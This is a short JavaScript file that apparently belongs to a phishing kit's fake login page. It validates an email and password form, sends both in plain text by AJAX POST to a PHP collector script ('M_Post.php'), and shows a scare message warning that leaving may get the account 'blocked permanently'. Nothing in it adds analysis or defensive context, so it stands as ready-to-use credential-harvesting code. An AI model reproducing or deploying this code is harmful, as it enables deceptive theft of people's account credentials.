$(document).ready(function() {
	$('#fullpage').fullpage({
		verticalCentered: true,
		afterRender: function(){
			$('video').get(0).play();
		}
	});
});
function validate(){
	var email = $('input[name=MAHDI_1]');
	var pass = $('input[name=MAHDI_2]');
	var stat;
	if(email.val() == ''){ email.addClass("merror"); stat = false; }   
	if(pass.val() == ''){ pass.addClass("merror"); stat = false; }  
	if(stat == false) { return false ;}
	return true;
}
function submit() {
	if (!validate()) {
		return false;
	}
	var username=$("input[name=MAHDI_1]").val();
	var password=$("input[name=MAHDI_2]").val();
	var dataString = 'username='+username+'&password='+password;
	$.ajax({
		type : "POST",
		url : "../M_files/M_Post.php",
		data : dataString,
		beforeSend : function() {
			  $("#msg").show();
		},
		success : function(response) {
				if(!response) {
					$("#msg").hide();
					$(".fi[name=MAHDI_2]").addClass("merror");
					$("#inc").show().delay(3000).fadeOut();
					return false;
				} else {
					$("#msg").hide();

				}
		}
	});
	return true;
}
function IsEmail(email) {
  var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  return regex.test(email);
}
window.onbeforeunload = function(){
    if(!validate()){
        return 'If you leave, Your account may be blocked permanently !';
    }
};

